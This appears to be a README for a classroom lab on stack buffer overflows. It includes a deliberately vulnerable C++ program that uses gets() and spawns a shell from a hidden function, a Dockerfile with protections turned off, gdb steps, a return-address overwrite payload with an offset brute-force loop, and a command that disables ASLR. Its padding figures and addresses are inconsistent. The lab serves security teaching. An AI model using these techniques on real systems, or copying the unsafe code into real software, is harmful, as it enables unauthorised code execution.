# Objective
# 🛡️ Teaching Buffer Overflow in C++

# 👨‍🏫 **Objective**: Understand how unsafe input functions in C/C++ can be exploited to alter program flow.

# Install 
## Clone the Repository 
```
git clone git@github.com:gtoscano/buffer-overflow.git
cd buffer-overflow
docker build -t buffer-overflow .
docker run -it buffer-overflow
```



---

## 🧠 What You’re About to Do

We'll exploit a simple C++ program that:

1. Uses `gets()` (unsafe)
2. Has a 64-byte buffer on the stack
3. Fails to check input size

👾 **Goal**: Redirect execution to a hidden `secret()` function.

---

## Diagram of Stack and Overflow
```
EBP = Extended Base Pointer
FP = Frame Pointer
RA = Return Address

                  +---------------------------+
                  |  higher stack frames     |  (previous function contexts)
                  +---------------------------+
                  |  saved EBP (old FP)      | <-- saved frame pointer for vulnerable()
                  +---------------------------+
(legit RA) ---->  |  return address for      | <-- normally points back to main()
                  |  vulnerable()            |
                  +---------------------------+
                  |                         |  
  buffer start -->|  buffer[0]              |  
                  |  buffer[1]              |  
                  |  buffer[2]              |  
                  |       ...               |  64 bytes allocated
                  |  buffer[63]             |  
  buffer end ---->|                         |
                  +---------------------------+
                  |  (possible padding)      | <-- not always present, but can exist
                  +---------------------------+
(overflow data) ->|  overwritten EBP         | <-- overwritten by out-of-bounds write
                  +---------------------------+
(overflow data) ->|  new return address      | <-- attacker-supplied address of secret()
                  +---------------------------+
                  |  rest of the stack...    |
                  +---------------------------+
```

## 🧪 The Vulnerable Code

```cpp
#include <iostream>
#include <cstdio>
#include <cstdlib>

void secret() {
    std::cout << "Access granted to secret!\n";
    system("/bin/sh");
}

void vulnerable() {
    char buffer[64];
    std::cout << "Enter text: ";
    gets(buffer);  // 💣 buffer overflow possible here!
}

int main() {
    vulnerable();
    return 0;
}
```

---

## 🐳 Set Up the Environment

```dockerfile
FROM ubuntu:12.04

RUN sed -i 's|archive.ubuntu.com|old-releases.ubuntu.com|g' /etc/apt/sources.list && \
    apt-get update && apt-get install -y build-essential gdb && apt-get clean

COPY vuln.cpp /vuln.cpp
RUN g++ -fno-stack-protector -z execstack vuln.cpp -o vuln
CMD ["/bin/bash"]
```

---

## 🔍 Step 1: Find `secret()` Address

Run:

```bash
gdb ./vuln
```

Then in `gdb`:

```gdb
info functions secret
```

Example output:

```
0x080484b6  secret()
```

---

## 🧮 Step 2: Calculate Overflow

Stack layout in `vulnerable()`:

```
[ buffer (64 bytes) ]
[ saved EBP (4 bytes) ]
[ return address (4 bytes) ] 👈 we overwrite this
```

➡️ Total: **68 bytes padding** + 4 bytes address

---

## 💥 Step 3: Craft the Payload

Assuming `secret()` is at `0x08048674`:

```bash
python -c 'print "A"*76 + "\x74\x86\x04\x08"' > payload
```
or:

```bash
for i in $(seq 60 78); do
  echo "Trying offset: $i"
  python -c "print 'A'*$i + '\x74\x86\x04\x08'" > payload
  ./vuln < payload && echo "💥 Success at offset $i!"
done
```


Run the attack:

```bash
./vuln < payload
```

💡 If successful: you get a shell!

---

## 🚧 Disable ASLR (for predictability)

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

This ensures addresses like `0x08048674` are stable.

---

## 🧠 Learning Takeaways

✅ Stack layout  
✅ Unsafe input = security risk  
✅ Return address hijack  
✅ Importance of memory-safe coding

---

## 🙏 Use Responsibly

- **For educational purposes only**
- Never exploit systems without permission
- Use modern practices: `fgets`, stack canaries, ASLR, PIE, etc.

---

# 🎓 Thank You!

Questions?  
Let's explore secure coding together!
